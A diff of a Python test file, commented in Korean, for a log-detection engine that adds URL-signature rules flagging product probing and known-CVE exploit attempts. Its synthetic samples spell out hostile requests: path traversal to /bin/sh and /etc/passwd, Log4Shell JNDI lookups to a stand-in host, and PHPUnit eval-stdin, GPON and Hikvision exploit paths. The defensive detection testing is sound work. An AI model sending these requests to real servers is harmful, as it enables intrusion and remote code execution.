@@ -23,6 +23,14 @@ v3 R005 는 σ 4.5(관측 분포 p99)에서 실험 DB 에 5칸이 있어 증분 
 w2(rules_w1.json)는 R102 에 exclude_url_patterns 를 더했다. 문장 자리 · 인자 순서 · 형식 오류는 가짜 커서로,
 패턴의 뜻은 파이썬 re 로 본다(쓰는 문법은 PostgreSQL 정규식과 같다). 두 DB 연결 중 하나가 있으면 PostgreSQL 에서도
 같은 목록을 돌리고, 실험 DB 에서는 w1 · w2 를 함께 돌려 오탐 사건 하나만 사라지는지 본다.
+
+c1(rules_cve.json, 이슈 #39)은 새 유형 url_signature(요청 경로 서명)다. 문장 · 인자 순서 · 형식 오류 · 신호 모양 ·
+근거의 서명 · 발생원 합집합은 가짜 커서로, 서명의 뜻은 저장소 파일을 읽어 합성 URL 표본을 파이썬 re 로 본다.
+OPSLOOP_TEST_DATABASE_URL 이 있으면 임시 표에 같은 표본을 넣고 PostgreSQL 이 같은 답을 내는지, 요청 하나가 서명
+여럿에 맞아도 신호 · 근거가 하나인지 본다. 서명 키가 없는 옛 규칙의 근거는 한 글자도 바뀌지 않아야 한다.
+KEV 조건(kev_match) · 자산 조건(asset_match)의 형식과, 서명 정규식이 두 엔진에서 같게 읽히는지(regex_gap)도 본다.
+DB 가 있으면 받는 정규식은 PostgreSQL 과 파이썬이 같은 답을, 거절하는 것은(정책으로 막는 것 밖) 실제로 다른 답을 내는지,
+늦게 들어온 더 이른 요청이 새 키 사건을 만들고 먼저 뜬 사건이 남는 구조적 한계(rules_cve.json note)를 본다.
 """
 import contextlib
 import copy
@@ -37,6 +45,7 @@ import threading
 import time
 import types
 import unittest
+import warnings
 from datetime import datetime, timedelta, timezone
 from unittest import mock
 
@@ -348,6 +357,12 @@ class SensorsTest(unittest.TestCase):
          "params": {"eventid_like": "%.agent.rejected", "exclude_shasum_prefixes": ["00"]}},
         {"id": "T5", "type": "actor_rate",
          "params": {"eventids": ["sshd.login.failed"], "window_seconds": 600, "threshold": 5}},
+        {"id": "T10", "type": "url_signature",
+         "params": {"eventids": ["nginx.request", "decoy.request"],
+                    "signatures": [{"id": "a", "pattern": "^/a$", "methods": ["PUT"], "cves": [], "mapping": "analyst"},
+                                   {"id": "b", "pattern": "^/b(/.*)?$", "cves": ["CVE-2021-41773"],
+                                    "mapping": "explicit"}]}},
+        # 기준선 이탈은 마지막에 둔다 (아래 시험이 RULES[-1] 로 따로 본다)
         {"id": "T6", "type": "baseline_deviation",
          "params": {"sigma": 3.0, "exclude_alerted_actors": True}},
     ]
@@ -395,12 +410,13 @@ class SensorsTest(unittest.TestCase):
 
 
 class RuleFileTest(unittest.TestCase):
-    """rules_self.json(s1) · rules_node.json(n1) · rules_w1.json(w2) · rules_audit.json(a1) · rules_infra.json(i2)."""
+    """rules_self.json(s1) · rules_node.json(n1) · rules_w1.json(w2) · rules_audit.json(a1) · rules_infra.json(i2) ·
+    rules_cve.json(c1)."""
 
     def test_형식은_rules_json_과_같다(self):
         base = load("rules.json")
         for name, ver in (("rules_self.json", "s1"), ("rules_node.json", "n1"), ("rules_w1.json", "w2"),
-                          ("rules_audit.json", "a1"), ("rules_infra.json", "i2")):
+                          ("rules_audit.json", "a1"), ("rules_infra.json", "i2"), ("rules_cve.json", "c1")):
             with self.subTest(rules=name):
                 doc = load(name)
                 self.assertEqual(doc["rule_version"], ver)
@@ -437,7 +453,7 @@ class RuleFileTest(unittest.TestCase):
 
     def test_rule_versions_에_파일_그대로_등록(self):
         for name in ("rules_self.json", "rules_node.json", "rules.json", "rules_v2.json",
-                     "rules_w1.json", "rules_audit.json", "rules_infra.json"):
+                     "rules_w1.json", "rules_audit.json", "rules_infra.json", "rules_cve.json"):
             with self.subTest(rules=name):
                 doc = load(name)
                 cur, _, _ = run_quiet(doc)
@@ -1590,7 +1606,7 @@ class NewRuleFileTest(unittest.TestCase):
     def test_새_버전은_기존_버전과_겹치지_않는다(self):
         versions = [load(n)["rule_version"] for n in ("rules.json", "rules_v2.json", "rules_self.json",
                                                       "rules_node.json", "rules_w1.json", "rules_audit.json",
-                                                      "rules_infra.json")]
+                                                      "rules_infra.json", "rules_cve.json")]
         self.assertEqual(len(set(versions)), len(versions))
 
     def test_기준선_입력이_바뀌지_않는다(self):
@@ -2019,7 +2035,7 @@ class RuleFileV3Test(unittest.TestCase):
 
     def test_버전이_겹치지_않고_파일_그대로_등록(self):
         names = ("rules.json", "rules_v2.json", "rules_v3.json", "rules_self.json", "rules_node.json",
-                 "rules_w1.json", "rules_audit.json", "rules_infra.json")
+                 "rules_w1.json", "rules_audit.json", "rules_infra.json", "rules_cve.json")
         versions = [load(n)["rule_version"] for n in names]
         self.assertEqual(len(set(versions)), len(versions))
         doc = load("rules_v3.json")
@@ -2863,6 +2879,612 @@ class LabReplayTest(unittest.TestCase):
         self.cur.execute("SELECT coalesce(sum((evidence #>> '{absorbed,incidents}')::int), 0) FROM incidents "
                          "WHERE rule_version = 'v3' AND rule_id IN ('R003', 'R006')")
         self.assertLess(self.cur.fetchone()[0], sum(1 for r in records if r[2] == "absorbed"))
+
+
+# ----------------------------------------------------------------------
+#  요청 경로 서명 (이슈 #39): c1 R105 · R106
+# ----------------------------------------------------------------------
+
+# url_signature 신호 질의 (범위 조각 {w} 자리). 엔진 상수를 쓰지 않고 글자 그대로 적어 문장이 바뀌면 드러나게 한다
+URL_SIGNATURE_SQL = (
+    "SELECT e.ts, e.src_ip, e.session, e.eventid, e.sensor, e.http_method, e.url, e.http_status, "
+    "array_agg(s.sig_id ORDER BY s.sig_id COLLATE \"C\") "
+    "FROM events e JOIN unnest(%s::text[], %s::text[], %s::text[]) AS s(sig_id, sig_pattern, sig_method) "
+    "ON e.url ~* s.sig_pattern AND coalesce(e.http_method, '') ~* s.sig_method "
+    "WHERE {w} AND eventid = ANY(%s) GROUP BY e.line_hash")
+WEB_EVENTIDS = ["nginx.request", "decoy.request"]
+DETAIL_KEYS = ["eventid", "sensor", "http_method", "url", "http_status", "signatures"]
+
+# 합성 URL 표본 (메서드, url, {규칙: 맞아야 하는 서명 id}). 운영 DB(9/18 ~ 9/24)에 R106 매치가 0건이라 합성으로 본다.
+# web-01(nginx)의 url 은 원시 요청 대상(%2e · 질의 그대로), 디코이는 1회 디코딩된 경로라 두 모양을 함께 둔다
+URL_SAMPLES = [
+    ("GET", "/cgi-bin/../../../../bin/sh", {"R106": ["apache-path-traversal"]}),          # 디코이 (디코딩됨)
+    ("GET", "/cgi-bin/.%2e/.%2e/.%2e/bin/sh", {"R106": ["apache-path-traversal"]}),        # 원시
+    ("GET", "/icons/.%2e/%2e%2e/%2e%2e/etc/passwd", {"R106": ["apache-path-traversal"]}),
+    ("POST", "/cgi-bin/.%%32%65/.%%32%65/bin/sh", {"R106": ["apache-path-traversal"]}),   # CVE-2021-42013 이중 인코딩
+    ("GET", "/CGI-BIN/%2E%2E/x", {"R106": ["apache-path-traversal"]}),                     # 대소문자
+    ("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", {"R106": ["phpunit-eval-stdin"]}),
+    ("POST", "/GponForm/diag_Form", {"R106": ["gpon-diag-form"]}),
+    ("PUT", "/SDK/webLanguage", {"R106": ["hikvision-weblanguage"]}),
+    ("put", "/sdk/weblanguage", {"R106": ["hikvision-weblanguage"]}),                      # 메서드도 대소문자 무시
+    ("GET", "/SDK/webLanguage", {}),                                                       # GET 은 제품 확인이라 세지 않는다
+    (None, "/SDK/webLanguage", {}),                                                        # 메서드가 없는 행
+    ("GET", "/${jndi:ldap://x/a}", {"R106": ["log4shell-in-path"]}),
+    ("GET", "/%24%7Bjndi%3Aldap://x}", {"R106": ["log4shell-in-path"]}),
+    ("GET", "/cgi-bin/../${jndi:ldap://x/a}", {"R106": ["apache-path-traversal", "log4shell-in-path"]}),  # 서명 둘
+    ("GET", "/geoserver", {"R105": ["geoserver"]}),
+    ("GET", "/geoserver/web/", {"R105": ["geoserver"]}),
+    ("GET", "/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage", {"R105": ["geoserver"]}),
+    ("GET", "/geoserverx", {}),
+    ("GET", "/geoserver/${jndi:ldap://x}", {"R105": ["geoserver"], "R106": ["log4shell-in-path"]}),  # 규칙 둘
+    ("GET", "/owa", {"R105": ["exchange-owa"]}),
+    ("GET", "/owa/", {"R105": ["exchange-owa"]}),
+    ("GET", "/owa/auth/logon.aspx?url=x", {"R105": ["exchange-owa"]}),                    # nginx 는 질의까지 남긴다
+    # web-01(nginx)의 url 은 질의 문자열까지 남는다. 서명 끝의 (\?.*)? 가 없으면 아래가 모두 빠진다
+    ("GET", "/GponForm/diag_Form?images/", {"R106": ["gpon-diag-form"]}),                 # CVE-2018-10561 의 대표 형태
+    ("GET", "/cgi-bin/authLogin.cgi?app=x", {"R105": ["qnap-qts"]}),
+    ("GET", "/HNAP1/?x", {"R105": ["dlink-hnap"]}),
+    ("GET", "/geoserver?x=1", {"R105": ["geoserver"]}),
+    ("GET", "/owa?x=1", {"R105": ["exchange-owa"]}),
+    ("PUT", "/SDK/webLanguage?x", {"R106": ["hikvision-weblanguage"]}),
+    ("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php?x", {"R106": ["phpunit-eval-stdin"]}),
+    ("GET", "/owax?y", {}),
+    (None, "/owa", {"R105": ["exchange-owa"]}),                                            # methods 가 없으면 메서드를 보지 않는다
+    ("GET", "/owax", {}),
+    # 디코이는 %0A 를 줄바꿈으로 풀어 남긴다. PostgreSQL 정규식의 . 은 줄바꿈에도 맞고 $ 는 문자열 끝에만 맞는다
+    ("GET", "/owa/\n", {"R105": ["exchange-owa"]}),
+    ("GET", "/owa\n", {}),
+    ("POST", "/HNAP1", {"R105": ["dlink-hnap"]}),
+    ("GET", "/HNAP1/", {"R105": ["dlink-hnap"]}),
+    ("GET", "/confluence/rest/applinks/1.0/manifest", {"R105": ["confluence"]}),
+    ("GET", "/dana-na/nc/nc_gina_ver.txt", {"R105": ["ivanti-connect-secure"]}),
+    ("GET", "/apps/zxtm/login.cgi", {"R105": ["ivanti-vtm"]}),
+    ("GET", "/cgi-bin/authLogin.cgi", {"R105": ["qnap-qts"]}),
+    ("GET", "/MagicInfo/config.js", {"R105": ["samsung-magicinfo"]}),
+    ("GET", "/cgi-bin/test.cgi", {}),
+    ("GET", "/icons/x.png", {}),
+    ("GET", "", {}),                                   # web-01 이 루트 위로 가는 경로를 400 으로 거절하며 url 을 비운 행
+]
+
+
+# 두 엔진(PostgreSQL ~* · 파이썬 re)이 다르게 읽거나 한쪽만 받는 정규식. 서명의 pattern · kev_match · images 에 두면
+# 규칙 오류다. 맨 앞 (?i) 도 받지 않는다(대소문자는 이미 가리지 않고, 플래그 글자의 뜻이 두 엔진에서 다르다)
+REGEX_GAPS = [
+    r"\bgeo", r"geo\B", r"(?P<n>geo)", r"(?P<n>g)(?P=n)", r"(?<n>geo)", r"(?<=x)geo", r"(?<!x)geo", r"geo(?=x)",
+    r"geo(?!x)", r"geo(?i)x", r"(?i)geo", r"(?i:geo)", r"(?m)^geo", r"(?>geo)", r"(?#c)geo", r"(g)\1", r"(g)(e)\2",
+    r"[\1]geo", r"[[:alpha:]]+", r"[[=e=]]", r"[[.a.]]", r"x[a[:digit:]]", r"[[a]geo", r"[a-z&&[^e]]", r"[a[]geo",
+    r"[a&&b]", r"[a||b]", r"[a~~b]", r"[a--b]",
+    r"geo{,2}", r"geo*+", r"geo++", r"geo?+", r"ge{2}+o", r"(geo)++", r"geo\z",
+    r"(geo", r"geo)", r"geo\y", r"\mgeo", r"*geo", r"***=geo", r"[geo",
+]
+# 두 엔진이 같게 읽는 것. 위와 비슷해 보여도 받는다
+REGEX_SAME = [
+    r"^(QTS|.*Network.Attached Storage.*)$", r"(^|/)confluence(:|@|$)", r"^(Ivanti|Pulse Secure)$",
+    r"geo\\b", r"geo\(?x", r"[(?]geo", r"[?(]geo", r"(?:geo)+?", r"(?:g|e)*o", r"geo{2}", r"geo{2,}", r"ge{1,3}o",
+    r"ge{1,3}?o", r"\{geo\}", r"(\$|%24)(\{|%7b)jndi(:|%3a)", r"[]a]geo", r"[^]a]geo", r"[a-z]+?", r"geo+?",
+    r"\Ageo\Z", r"%2e", r"[\]]geo", r"geo\+", r"geo\++", r"geo\?+", r"a[+?*]+", r"\(\?geo",
+    r"\d+\.\d+", r"[0-9]{4}", r"\.%2e", r"(\.|%2e|%%32%65){2}/", r"[\[a]geo", r"[a&b|c~d-]", r"[-a]", r"&&geo",
+]
+
+
+def sig_match(rule, method, url):
+    """서명의 파이썬 동치. 맞는 서명 id 를 정렬해 돌려준다.
+
+    re.fullmatch(pattern, url, re.I) 에 re.S 를 더한다. PostgreSQL 정규식(ARE)은 기본으로 . 이 줄바꿈에도 맞고, 파이썬
+    fullmatch 는 줄바꿈 앞의 $ 로는 끝을 맞추지 못하므로, 둘을 함께 주면 줄바꿈이 든 url 에서도 같은 답이 된다.
+    """
+    return sorted(s["id"] for s in rule["params"]["signatures"]
+                  if re.fullmatch(s["pattern"], url, re.I | re.S)
+                  and ("methods" not in s or (method or "").upper() in s["methods"]))
+
+
+def sig_rule(**sig):
+    """서명 하나짜리 시험 규칙. 키를 None 으로 주면 그 키를 뺀다."""
+    base = {"id": "a", "pattern": "^/a$", "cves": [], "mapping": "analyst"}
+    base.update(sig)
+    return {"id": "U1", "type": "url_signature",
+            "params": {"eventids": ["nginx.request"], "signatures": [{k: v for k, v in base.items() if v is not None}]}}
+
+
+def cve_doc(*rids):
+    """rules_cve.json 에서 주어진 규칙만 남긴 정의."""
+    doc = copy.deepcopy(load("rules_cve.json"))
+    doc["rules"] = [r for r in doc["rules"] if r["id"] in rids]
+    return doc
+
+
+class UrlSignatureTest(unittest.TestCase):
+    """url_signature 의 문장 · 인자 순서 · 형식 오류 · 신호 모양."""
+
+    def test_문장과_인자(self):
+        doc, rule = rule_of("rules_cve.json", "R106")
+        sigs = rule["params"]["signatures"]
+        ids = [s["id"] for s in sigs]
+        pats = [f"^(?:{s['pattern']})$" for s in sigs]
+        methods = ["^(PUT)$" if s["id"] == "hikvision-weblanguage" else "^.*$" for s in sigs]
+        for rng, where in (((None, None), "provenance = 'real'"),
+                           ((SINCE, UNTIL), "provenance = 'real' AND ts >= %s AND ts < %s"),
+                           ((SINCE, None), "provenance = 'real' AND ts >= %s")):
+            with self.subTest(rng=rng):
+                [(sql, prm)] = collect(doc, rule, *rng)
+                self.assertEqual(sql, URL_SIGNATURE_SQL.replace("{w}", where))
+                self.assertEqual(prm, [ids, pats, methods] + [x for x in rng if x] + [WEB_EVENTIDS])
+                self.assertEqual(sql.count("%s"), len(prm))
+        self.assertEqual(detect.URL_SIGNATURE_SQL.format(w="x"), URL_SIGNATURE_SQL.replace("{w}", "x"))
+
+    def test_메서드는_대문자_선택지_하나로(self):
+        for methods, want in ((["PUT"], "^(PUT)$"), (["PUT", "POST"], "^(PUT|POST)$"), (None, "^.*$")):
+            with self.subTest(methods=methods):
+                [(_, prm)] = collect({"rule_version": "t1"}, sig_rule(methods=methods))
+                self.assertEqual(prm[2], [want])
+
+    def test_옳은_형식은_받는다(self):
+        # 탐지가 쓰지 않는 키(product · vendor · source)는 보지 않는다. 빈 cves 는 R105 의 꼴이다.
+        # kev_match · asset_match 는 없어도 되고, 있으면 형식을 본다. platforms · packages · images 는 빈 목록도 된다
+        for sig in ({}, {"methods": ["GET", "HEAD"]}, {"cves": ["CVE-2021-41773", "CVE-2024-123456"]},
+                    {"mapping": "explicit", "product": "시험", "kev_match": {"vendor": "^x$"},
+                     "asset_match": {"platforms": [], "packages": [], "images": []}},
+                    {"kev_match": {"vendor": "^(Ivanti|Pulse Secure)$", "product": "Connect Secure", "text": "HNAP"}},
+                    {"asset_match": {"platforms": ["linux", "windows", "appliance"],
+                                     "packages": ["apache2", "liblog4j2-java", "libstdc++6", "g++-13", "python3.12"],
+                                     "images": ["(^|/)httpd(:|@|$)"], "note": "시험"}},
+                    {"id": "a0-b", "pattern": "^.*$"}):
+            with self.subTest(sig=sig):
+                self.assertEqual(len(collect({"rule_version": "t1"}, sig_rule(**sig))), 1)
+
+    def test_KEV_자산_조건_형식이_틀리면_규칙_오류(self):
+        # 콘솔(app/cti.py) · CTI 수집기가 rule_versions 에서 읽는 조건이다. 틀린 정의가 한 번 들어가면 같은 버전으로는
+        # 고칠 수 없으므로(ON CONFLICT DO NOTHING) 탐지가 먼저 거절한다. 모르는 키도 오타로 보고 거절한다
+        full = {"platforms": ["linux"], "packages": [], "images": []}
+        bad = [{"kev_match": v} for v in (
+            None, "^x$", [], {}, {"product": "^x$"}, {"vendor": ""}, {"vendor": 1}, {"vendor": None},
+            {"vendor": "^x$", "product": None}, {"vendor": "^x$", "product": ""}, {"vendor": "^x$", "text": 1},
+            {"vendor": "^x$", "text": ["x"]}, {"vendor": "^x$", "vendors": "^y$"})]
+        bad += [{"asset_match": v} for v in (
+            None, [], "linux", {}, {"platforms": ["linux"], "packages": []},
+            {"platforms": ["linux"], "images": []}, {"packages": [], "images": []},
+            dict(full, platforms="linux"), dict(full, platforms=["mac"]), dict(full, platforms=["Linux"]),
+            dict(full, platforms=["linux", "linux"]), dict(full, platforms=[None]),
+            dict(full, packages="apache2"), dict(full, packages=[1]), dict(full, packages=[""]),
+            dict(full, packages=["Apache2"]), dict(full, packages=["apache 2"]), dict(full, packages=["a"]),
+            dict(full, packages=["-a"]), dict(full, images="(^|/)httpd"), dict(full, images=[1]),
+            dict(full, images=[""]), dict(full, images=None), dict(full, note=1), dict(full, note=""),
+            dict(full, note=None), dict(full, image=[]))]
+        for sig in bad:
+            with self.subTest(sig=sig):
+                r = sig_rule()
+                r["params"]["signatures"][0].update(sig)                  # None 도 값으로 넣는다(sig_rule 은 키를 뺀다)
+                with self.assertRaisesRegex(ValueError, "^U1: 서명 a 의 (kev_match|asset_match)"):
+                    collect({"rule_version": "t1"}, r)
+
+    def test_두_엔진이_다르게_읽는_정규식은_규칙_오류(self):
+        # pattern · kev_match 는 PostgreSQL(~*)이, kev_match · images 는 파이썬(re.search)이 읽는다. 어느 자리에 있어도 거절한다
+        for text in REGEX_GAPS:
+            for where, sig in (("pattern", {"pattern": f"^{text}$"}),
+                               ("kev_match.vendor", {"kev_match": {"vendor": text}}),
+                               ("kev_match.product", {"kev_match": {"vendor": "^x$", "product": text}}),
+                               ("kev_match.text", {"kev_match": {"vendor": "^x$", "text": text}}),
+                               ("asset_match.images", {"asset_match": {"platforms": [], "packages": [],
+                                                                       "images": ["^ok$", text]}})):
+                with self.subTest(where=where, text=text):
+                    with self.assertRaisesRegex(ValueError, f"^U1: 서명 a 의 {re.escape(where)} "):
+                        collect({"rule_version": "t1"}, sig_rule(**sig))
+                    self.assertIsNotNone(detect.regex_gap(text))
+
+    def test_두_엔진이_같게_읽는_정규식은_받는다(self):
+        for text in REGEX_SAME:
+            with self.subTest(text=text):
+                self.assertIsNone(detect.regex_gap(text))
+                sig = {"pattern": f"^{text}$", "kev_match": {"vendor": text, "product": text, "text": text},
+                       "asset_match": {"platforms": [], "packages": [], "images": [text]}}
+                self.assertEqual(len(collect({"rule_version": "t1"}, sig_rule(**sig))), 1)
+
+    def test_형식이_틀리면_규칙_오류(self):
+        bad_sigs = [
+            {"id": ""}, {"id": "A"}, {"id": "-a"}, {"id": "a_b"}, {"id": "a b"}, {"id": 1}, {"id": "a\n"},
+            {"pattern": ""}, {"pattern": "^$"}, {"pattern": "/a"}, {"pattern": "^/a"}, {"pattern": "/a$"},
+            {"pattern": 1},
+            {"methods": []}, {"methods": "PUT"}, {"methods": ["put"]}, {"methods": ["P-UT"]}, {"methods": [""]},
+            {"methods": ["PUT\n"]}, {"methods": [1]},
+            {"cves": "CVE-2021-41773"}, {"cves": ["CVE-21-41773"]}, {"cves": ["cve-2021-41773"]},
+            {"cves": ["CVE-2021-123"]}, {"cves": ["CVE-2021-41773\n"]}, {"cves": [None]},
+            {"mapping": "exact"}, {"mapping": ["explicit"]},
+        ]
+        rules = [sig_rule(**s) for s in bad_sigs]
+        for key in ("id", "pattern", "cves", "mapping"):                   # 빠져도 오류
+            r = sig_rule()
+            del r["params"]["signatures"][0][key]
+            rules.append(r)
+        r = sig_rule()
+        r["params"]["signatures"][0]["methods"] = None                     # 키가 있으면 목록이어야 한다
+        rules.append(r)
+        r = sig_rule()
+        r["params"]["signatures"].append(dict(r["params"]["signatures"][0], pattern="^/b$"))   # id 겹침
+        rules.append(r)
+        for params in ({"eventids": []}, {"eventids": "nginx.request"}, {"eventids": [""]}, {"eventids": [1]},
+                       {"eventids": None}, {"signatures": []}, {"signatures": {}}, {"signatures": None},
+                       {"signatures": ["a"]}, {"signatures": [None]}, {"sensors": []}):
+            r = sig_rule()
+            r["params"].update(params)
+            rules.append({**r, "params": {k: v for k, v in r["params"].items() if v is not None}})
+        for r in rules:
+            with self.subTest(params=r["params"]):
+                with self.assertRaisesRegex(ValueError, "^U1: "):
+                    collect({"rule_version": "t1"}, r)
+
+    def test_신호_모양(self):
+        doc, rule = rule_of("rules_cve.json", "R106")
+        rows = [(at(0), "192.0.2.7", None, "nginx.request", "web-01", "GET", "/%24%7Bjndi%3Aldap://x}", 404,
+                 ["log4shell-in-path"]),
+                (at(1), "192.0.2.7", "d1a2b3c4", "decoy.request", "decoy", "GET", "/cgi-bin/../${jndi:ldap://x/a}",
+                 404, ["apache-path-traversal", "log4shell-in-path"])]
+        sig = signals_of(doc, rule, lambda sql: rows)
+        self.assertEqual(sig, [
+            (at(0), "192.0.2.7", None, {"eventid": "nginx.request", "sensor": "web-01", "http_method": "GET",
+                                        "url": "/%24%7Bjndi%3Aldap://x}", "http_status": 404,
+                                        "signatures": ["log4shell-in-path"]}),
+            (at(1), "192.0.2.7", "d1a2b3c4", {"eventid": "decoy.request", "sensor": "decoy", "http_method": "GET",
+                                              "url": "/cgi-bin/../${jndi:ldap://x/a}", "http_status": 404,
+                                              "signatures": ["apache-path-traversal", "log4shell-in-path"]})])
+        for _, _, _, d in sig:
+            self.assertEqual(list(d), DETAIL_KEYS)
+            # run() 이 임계치로 읽는 키 · 제어 필드를 쓰지 않는다
+            self.assertFalse(set(d) & {"count", "sigma", "mean", "z", *detect.CONTROL_FIELDS})
+
+    def test_요청_하나는_신호_하나(self):
+        # 서명마다 한 행씩 이은 뒤 요청(line_hash)으로 다시 묶는다. 서명 여럿에 맞은 요청은 id 를 모두 가진 한 행이다
+        doc, rule = rule_of("rules_cve.json", "R106")
+        [(sql, _)] = collect(doc, rule)
+        self.assertTrue(sql.endswith(" GROUP BY e.line_hash"))
+        self.assertIn("array_agg(s.sig_id ORDER BY s.sig_id COLLATE \"C\")", sql)
+        self.assertEqual(sig_match(rule, "GET", "/cgi-bin/../${jndi:ldap://x/a}"),
+                         ["apache-path-traversal", "log4shell-in-path"])
+
+
+class UrlSignatureRunTest(unittest.TestCase):
+    """run() 이 근거에 신호 전체의 서명 id · 발생원 합집합을 붙인다. 서명 키가 없는 규칙은 근거가 그대로다."""
+
+    @staticmethod
+    def request(m, ip, sensor, url, ids, session=None, method="GET", status=404):
+        eventid = "decoy.request" if sensor == "decoy" else "nginx.request"
+        return (at(m), ip, session, eventid, sensor, method, url, status, ids)
+
+    def test_근거에_서명_발생원_합집합(self):
+        ip = "203.0.113.9"
+        r106 = [self.request(0, ip, "decoy", "/cgi-bin/../../bin/sh", ["apache-path-traversal"], "d1"),
+                self.request(1, ip, "decoy", "/cgi-bin/../../../bin/sh", ["apache-path-traversal"], "d1"),
+                self.request(2, ip, "web-01", "/GponForm/diag_Form", ["gpon-diag-form"], method="POST"),
+                self.request(3, ip, "decoy", "/icons/../../etc/passwd", ["apache-path-traversal"], "d2"),
+                self.request(4, ip, "decoy", "/cgi-bin/../../bin/bash", ["apache-path-traversal"], "d2"),
+                # 표본(앞 5개) 밖에만 있는 서명 · 발생원도 근거에 남는다. 발생원이 없는 신호는 세지 않는다
+                self.request(5, ip, "web-02", "/SDK/webLanguage", ["hikvision-weblanguage"], method="PUT"),
+                self.request(6, ip, None, "/${jndi:ldap://x}", ["log4shell-in-path"]),
+                # 통합 창(15분) 밖은 다른 사건이다
+                self.request(60, ip, "decoy", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+                             ["phpunit-eval-stdin"], "d3", method="POST")]
+        r105 = [self.request(0, "198.51.100.5", "decoy", "/geoserver/web/", ["geoserver"], "d9"),
+                self.request(1, "198.51.100.5", "web-01", "/owa/", ["exchange-owa"])]
+        answers = iter([r105, r106])
+
+        def answer(sql):
+            if sql.startswith("SELECT e.ts, e.src_ip"):
+                return next(answers)
+            return db_answer()(sql)
+
+        doc = load("rules_cve.json")
+        cur, conn, _ = run_quiet(doc, answer)
+        [(sql5, rows5), (sql6, rows6)] = cur.batches
+        self.assertEqual((sql5, sql6), (detect.INSERT_BASE, detect.INSERT_BASE))
+        self.assertEqual(conn.commits, 1)
+
+        [g] = rows5
+        self.assertEqual(g[:10], (f"R105|c1|198.51.100.5|{at(0).isoformat()}", "R105", "c1", "제품 식별 탐색", "low",
+                                  "198.51.100.5", at(0), at(1), 2, 1))
+        ev = json.loads(g[10])
+        self.assertEqual((ev["signatures"], ev["sensors"]), (["exchange-owa", "geoserver"], ["decoy", "web-01"]))
+
+        big, late = rows6
+        self.assertEqual(big[:10], (f"R106|c1|{ip}|{at(0).isoformat()}", "R106", "c1", "알려진 취약점 공격 시도",
+                                    "medium", ip, at(0), at(6), 7, 2))
+        ev = json.loads(big[10])
+        self.assertEqual(list(ev), ["sample", "sessions", "signatures", "sensors"])
+        self.assertEqual(len(ev["sample"]), 5)
+        self.assertEqual(ev["sample"][2], {"eventid": "nginx.request", "sensor": "web-01", "http_method": "POST",
+                                           "url": "/GponForm/diag_Form", "http_status": 404,
+                                           "signatures": ["gpon-diag-form"]})
+        self.assertEqual(ev["sessions"], ["d1", "d2"])
+        self.assertEqual(ev["signatures"], ["apache-path-traversal", "gpon-diag-form", "hikvision-weblanguage",
+                                            "log4shell-in-path"])
+        self.assertEqual(ev["sensors"], ["decoy", "web-01", "web-02"])
+        ev = json.loads(late[10])
+        self.assertEqual((late[6], ev["signatures"], ev["sensors"]), (at(60), ["phpunit-eval-stdin"], ["decoy"]))
+
+    def test_서명_키가_없으면_근거가_그대로(self):
+        # 발생원 키만 있고 서명 키가 없는 신호(다른 유형)는 합집합을 붙이지 않는다
+        doc = {"rule_version": "x1", "aggregation": {"window_gap_seconds": 900},
+               "rules": [{"id": "X3", "name": "시험", "severity": "low", "type": "x_plain", "params": {}}]}
+        sig = [(at(0), "6.6.6.6", "s1", {"eventid": "e", "sensor": "web-01"}),
+               (at(1), "6.6.6.6", None, {"eventid": "e", "sensor": "decoy", "count": 3})]
+        with mock.patch.dict(detect.COLLECTORS, {"x_plain": lambda *a: sig}):
+            cur, _, _ = run_quiet(doc)
+        [(_, [row])] = cur.batches
+        self.assertEqual(row[10], json.dumps({"sample": [d for *_, d in sig], "sessions": ["s1"],
+                                              "observed_count_max": 3}, ensure_ascii=False))
+
+    def test_옛_규칙_파일의_근거에는_합집합이_없다(self):
+        for name in ("rules.json", "rules_v2.json", "rules_node.json", "rules_self.json", "rules_w1.json"):
+            with self.subTest(rules=name):
+                cur, _, _ = run_quiet(load(name), signal_answer)
+                rows = [r for _, rs in cur.batches for r in rs]
+                self.assertTrue(rows)
+                for r in rows:
+                    self.assertFalse({"signatures", "sensors"} & set(json.loads(r[10])))
+
+
+class CveRuleFileTest(unittest.TestCase):
+    """rules_cve.json(c1). 저장소의 진짜 파일을 읽어 본다."""
+
+    def test_규칙과_서명_목록(self):
+        doc = load("rules_cve.json")
+        self.assertEqual(doc["rule_version"], "c1")
+        self.assertEqual([(r["id"], r["name"], r["severity"], r["type"]) for r in doc["rules"]], [
+            ("R105", "제품 식별 탐색", "low", "url_signature"),
+            ("R106", "알려진 취약점 공격 시도", "medium", "url_signature")])
+        # 억제 · 흡수를 쓰지 않는다. R105 · R106 · w2 R102 는 서로 지우지 않는다
+        self.assertNotIn("suppression", doc)
+        r105, r106 = doc["rules"]
+        for rule in doc["rules"]:
+            with self.subTest(rule=rule["id"]):
+                self.assertEqual(set(rule["params"]), {"eventids", "signatures"})
+                self.assertEqual(rule["params"]["eventids"], WEB_EVENTIDS)
+                self.assertIsNone(detect.absorb_conf(rule))
+                for s in rule["params"]["signatures"]:
+                    self.assertIn(s["mapping"], detect.SIG_MAPPINGS)
+                    self.assertTrue(s["product"] and s["vendor"] and s["source"])
+                    self.assertLessEqual(set(s["asset_match"]["platforms"]), {"linux", "windows", "appliance"})
+                    self.assertTrue(s["asset_match"]["platforms"])
+        self.assertEqual([s["id"] for s in r105["params"]["signatures"]], [
+            "confluence", "dlink-hnap", "exchange-owa", "geoserver", "ivanti-connect-secure", "ivanti-vtm",
+            "qnap-qts", "samsung-magicinfo"])
+        self.assertEqual([s["id"] for s in r106["params"]["signatures"]], [
+            "apache-path-traversal", "gpon-diag-form", "hikvision-weblanguage", "log4shell-in-path",
+            "phpunit-eval-stdin"])
+        # R105 는 CVE 를 적지 않고 KEV 에서 제품으로 찾는다. R106 은 서명마다 CVE 를 적는다
+        for s in r105["params"]["signatures"]:
+            self.assertEqual(s["cves"], [])
+            self.assertTrue(s["kev_match"]["vendor"])
+        for s in r106["params"]["signatures"]:
+            self.assertTrue(s["cves"])
+            self.assertNotIn("kev_match", s)
+        self.assertEqual({s["id"]: s["methods"] for s in r106["params"]["signatures"] if "methods" in s},
+                         {"hikvision-weblanguage": ["PUT"]})
+        self.assertFalse(any("methods" in s for s in r105["params"]["signatures"]))
+
+    def test_탐지기가_받는_형식(self):
+        doc = load("rules_cve.json")
+        for rule in doc["rules"]:
